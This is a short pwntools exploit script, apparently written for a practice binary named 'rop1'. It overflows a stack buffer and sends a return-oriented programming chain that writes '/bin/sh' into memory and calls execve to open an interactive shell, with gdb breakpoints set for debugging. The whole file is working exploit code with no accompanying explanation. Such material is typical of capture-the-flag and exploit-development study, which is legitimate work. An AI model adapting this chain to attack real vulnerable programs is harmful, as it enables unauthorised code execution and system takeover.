#!/bin/python

from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./rop1', gdbscript = '''
    b main
    b *0x4017ae
    b *0x43f7e8
    c
        ''')
#io = process('./rop1')

RW_ADDR = 0x4ae000

POP_RAX_ADDR = 0x43f7e7
POP_RBX_ADDR = 0x40193d
POP_RSI_ADDR = 0x40861e
POP_RDI_ADDR = 0x401cde
SYSCALL_ADDR = 0x4011fe

MOV_RBX_RAX_POP_RAX_POP_RDX_POP_RBX_ADDR = 0x47ae1c


SYS_WRITE = 1
SYS_EXECVE = 59
SYS_EXIT = 60

STDOUT = 1


io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        p64(POP_RAX_ADDR) +
        b'/bin/sh\x00' +
        p64(POP_RBX_ADDR) +
        p64(RW_ADDR) +                  # buffor
        p64(MOV_RBX_RAX_POP_RAX_POP_RDX_POP_RBX_ADDR) +
        p64(SYS_EXECVE) +               # syscall no
        p64(0x00) +                     # envp
        p64(0xdeadbeefcafebabe) +
        p64(POP_RSI_ADDR) +
        p64(0x00) +                     # argv
        p64(POP_RDI_ADDR) +
        p64(RW_ADDR) +                  # filename
        p64(SYSCALL_ADDR)

        # no need for exit syscall if execve succeeds
    )

io.interactive()
